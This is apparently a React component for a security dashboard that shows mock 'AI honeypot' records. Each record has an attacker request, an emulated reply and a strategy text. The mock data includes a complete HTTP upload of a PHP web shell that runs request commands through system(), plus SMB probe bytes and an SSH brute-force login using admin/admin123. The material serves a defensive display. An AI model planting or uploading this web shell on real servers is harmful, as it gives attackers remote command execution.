
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Network } from 'lucide-react';

// Mock AI honeypot data
const mockAIResponses = [
  {
    id: 'resp-001',
    timestamp: new Date().getTime() - 1000 * 60 * 5,
    attackerIP: '45.95.147.32',
    country: 'Russia',
    requestType: 'SMB Probe',
    request: `
\\x00\\x00\\x00\\xc0\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02"\\x02$\\x02'\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01`,
    aiResponse: `
\\x00\\x00\\x00\\xc8\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02"\\x02$\\x02'\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00`,
    filePresented: 'windows/system32/drivers/tcpip.sys (emulated)',
    aiStrategy: 'SMB Dialect Negotiation - The AI honeypot is presenting a seemingly vulnerable SMB service while logging all connection attempts. The emulated response mimics a Windows Server system with outdated SMB version.',
    status: 'Attacker probing, no file access yet'
  },
  {
    id: 'resp-002',
    timestamp: new Date().getTime() - 1000 * 60 * 15,
    attackerIP: '118.193.32.54',
    country: 'China',
    requestType: 'MySQL Auth Bypass',
    request: `
4d:00:00:01:85:ae:7f:00:00:00:00:01:21:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:72:6f:6f:74:00:14:cf:ae:14:55:77:ab:33:c8:52:66:b1:57:ed:38:a4:9a:73:68:65:6c:6c:2e:6e:77:73:2e:6f:72:61:63:6c:65:2e:63:6f:6d:00`,
    aiResponse: `
50:00:00:02:ff:15:04:23:32:38:30:30:30:45:72:72:6f:72:3a:20:41:63:63:65:73:73:20:64:65:6e:69:65:64:20:66:6f:72:20:75:73:65:72:20:27:72:6f:6f:74:27:40:27:31:31:38:2e:31:39:33:2e:33:32:2e:35:34:27:20:28:75:73:69:6e:67:20:70:61:73:73:77:6f:72:64:3a:20:59:45:53:29:00:60:05:23:32:38:30:30:30:00`,
    filePresented: 'mysql/data/mysql.user (emulated)',
    aiStrategy: "Authentication Honeypot - The AI system is logging MySQL authentication attempts. It's presenting a fake MySQL authentication challenge that appears exploitable but instead records all credentials.",
    status: 'Authentication failure recorded'
  },
  {
    id: 'resp-003',
    timestamp: new Date().getTime() - 1000 * 60 * 30,
    attackerIP: '209.141.60.231',
    country: 'United States',
    requestType: 'HTTP Shell Upload',
    request: `
POST /admin/upload.php HTTP/1.1
Host: 192.168.1.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
Content-Length: 834

-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="uploaded_file"; filename="shell.php"
Content-Type: application/x-php

<?php
echo "<pre>";
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
echo "</pre>";
?>

-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="submit"

Upload
-----------------------------735323031399963166993862150--`,
    aiResponse: `
HTTP/1.1 200 OK
Date: Wed, 21 Apr 2023 10:30:45 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 52
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

File uploaded successfully to /var/www/html/uploads/shell.php`,
    filePresented: 'uploads/shell.php (honeypot controlled)',
    aiStrategy: 'Web Shell Honeytrap - The AI system has detected an attempt to upload a PHP web shell. It appears to accept the upload but places it in an isolated container environment. Every command executed via this shell will be recorded and analyzed while presenting fake system responses.',
    status: 'File uploaded, attacker activity being monitored'
  },
  {
    id: 'resp-004',
    timestamp: new Date().getTime() - 1000 * 60 * 45,
    attackerIP: '91.134.244.15',
    country: 'Netherlands',
    requestType: 'SSH Brute Force',
    request: `
SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3
...
00000070: 06 de 91 e5 0c 7d 54 84  cd c2 2d fb 05 9e 23 12  .....}T...
00000080: 95 67 11 42 bc 31 08 21  de 8a 5a 3a 9e 31 8a 7b  .g.B.1.!..Z:.1.{
...
username: admin
password: admin123
...`,
    aiResponse: `
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
...
00000040: 00 00 04 0b 00 00 00 0c  73 73 68 2d 75 73 65 72  ........ssh-user
00000050: 61 75 74 68 00 00 00 08  70 61 73 73 77 6f 72 64  auth....password
...
Last login: Wed Apr 21 06:15:43 2023 from 91.134.244.15

admin@honeypot:~$ `,
    filePresented: '/etc/passwd, /home/admin/.bash_history (emulated)',
    aiStrategy: 'SSH Authentication Honeypot - The AI system is presenting a fake SSH server that allows specific credential combinations to log in. Once logged in, the attacker is placed in a controlled environment that monitors all commands while presenting a realistic Linux system structure.',
    status: 'Login successful, command monitoring active'
  },
];

const AIResponseViewer = () => {
  const [selectedResponse, setSelectedResponse] = useState(mockAIResponses[0]);
  const [activeTab, setActiveTab] = useState('overview');
  const [liveResponses, setLiveResponses] = useState(mockAIResponses);

  // Simulate real-time updates
  useEffect(() => {
    const interval = setInterval(() => {
      // Add a timestamp to make it look like it's updating
      setLiveResponses(prev => {
        const updated = [...prev];
        const randomIndex = Math.floor(Math.random() * updated.length);
        updated[randomIndex] = {
          ...updated[randomIndex],
          timestamp: Date.now()
        };
        return updated;
      });
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const formatHexDisplay = (hexString: string) => {
    // Clean the string and format it for display
    return hexString
      .trim()
      .split('\n')
      .map(line => line.trim())
      .join('\n');
  };

  return (
    <div className="container mx-auto py-6 px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-3 gap-4">
      <Card className="cyber-card md:col-span-1">
        <CardHeader>
          <CardTitle className="flex items-center">
            <Network className="mr-2 h-5 w-5 text-cyber-accent" />
            AI Honeypot Interactions
          </CardTitle>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[600px] pr-4">
            <div className="space-y-1">
              {liveResponses.map((response) => (
                <button
                  key={response.id}
                  className={`w-full px-3 py-2 text-left rounded-md transition-colors ${
                    selectedResponse.id === response.id
                      ? 'bg-cyber-accent text-white'
                      : 'hover:bg-cyber-muted'
                  }`}
                  onClick={() => setSelectedResponse(response)}
                >
                  <div className="flex items-center">
                    <div className={`h-2 w-2 rounded-full mr-2 ${
                      Date.now() - response.timestamp < 10000 
                        ? 'bg-cyber-success animate-pulse' 
                        : 'bg-cyber-foreground/50'
                    }`}></div>
                    <div className="ml-1 flex-1">
                      <div className="font-medium truncate">{response.requestType}</div>
                      <div className="text-xs opacity-70 flex justify-between">
                        <span>{response.attackerIP}</span>
                        <span>{response.country}</span>
                      </div>
                    </div>
                  </div>
                  <div className="mt-1 text-xs opacity-60 text-right">
                    {new Date(response.timestamp).toLocaleTimeString()}
                  </div>
                </button>
              ))}
            </div>
          </ScrollArea>
        </CardContent>
      </Card>

      <Card className="cyber-card md:col-span-2">
        <CardHeader>
          <CardTitle className="flex items-center justify-between">
            <span>AI Interaction Details: {selectedResponse.requestType}</span>
            <span className="text-sm font-normal text-cyber-foreground/70">
              {new Date(selectedResponse.timestamp).toLocaleString()}
            </span>
          </CardTitle>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="overview" value={activeTab} onValueChange={setActiveTab}>
            <TabsList className="mb-4 bg-cyber-muted border border-cyber-border">
              <TabsTrigger value="overview">Overview</TabsTrigger>
              <TabsTrigger value="request">Attacker Request</TabsTrigger>
              <TabsTrigger value="response">AI Response</TabsTrigger>
              <TabsTrigger value="strategy">AI Strategy</TabsTrigger>
            </TabsList>
            
            <TabsContent value="overview" className="animate-fade-in">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div className="space-y-2">
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Attacker IP:</span>
                    <span className="ml-2 font-mono">{selectedResponse.attackerIP}</span>
                  </div>
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Origin:</span>
                    <span className="ml-2">{selectedResponse.country}</span>
                  </div>
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Request Type:</span>
                    <span className="ml-2">{selectedResponse.requestType}</span>
                  </div>
                </div>
                <div className="space-y-2">
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Status:</span>
                    <span className="ml-2">{selectedResponse.status}</span>
                  </div>
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Files Exposed:</span>
                    <span className="ml-2 font-mono text-xs">{selectedResponse.filePresented}</span>
                  </div>
                  <div>
                    <span className="text-sm text-cyber-foreground/70">Timestamp:</span>
                    <span className="ml-2">{new Date(selectedResponse.timestamp).toLocaleString()}</span>
                  </div>
                </div>
              </div>
              
              <div className="mt-4">
                <h3 className="text-lg font-medium mb-2">AI Response Strategy</h3>
                <p className="text-cyber-foreground/80">{selectedResponse.aiStrategy}</p>
              </div>
            </TabsContent>
            
            <TabsContent value="request" className="animate-fade-in">
              <div className="space-y-4">
                <h3 className="text-lg font-medium mb-2">Attacker Request</h3>
                <ScrollArea className="h-[400px] w-full rounded cyber-card p-4 font-mono text-xs">
                  <pre className="whitespace-pre-wrap break-all">{formatHexDisplay(selectedResponse.request)}</pre>
                </ScrollArea>
              </div>
            </TabsContent>
            
            <TabsContent value="response" className="animate-fade-in">
              <div className="space-y-4">
                <h3 className="text-lg font-medium mb-2">AI Generated Response</h3>
                <ScrollArea className="h-[400px] w-full rounded cyber-card p-4 font-mono text-xs">
                  <pre className="whitespace-pre-wrap break-all">{formatHexDisplay(selectedResponse.aiResponse)}</pre>
                </ScrollArea>
              </div>
            </TabsContent>
            
            <TabsContent value="strategy" className="animate-fade-in">
              <div className="space-y-4">
                <h3 className="text-lg font-medium mb-2">AI Honeypot Strategy</h3>
                <div className="cyber-card p-4">
                  <p className="mb-4">{selectedResponse.aiStrategy}</p>
                  
                  <h4 className="font-medium mb-2">Files Presented to Attacker:</h4>
                  <div className="bg-cyber/50 p-2 rounded font-mono text-sm mb-4">
                    {selectedResponse.filePresented}
                  </div>
                  
                  <h4 className="font-medium mb-2">Current Status:</h4>
                  <div className="bg-cyber-accent/10 border border-cyber-accent/20 text-cyber-accent p-2 rounded">
                    {selectedResponse.status}
                  </div>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
};

export default AIResponseViewer;
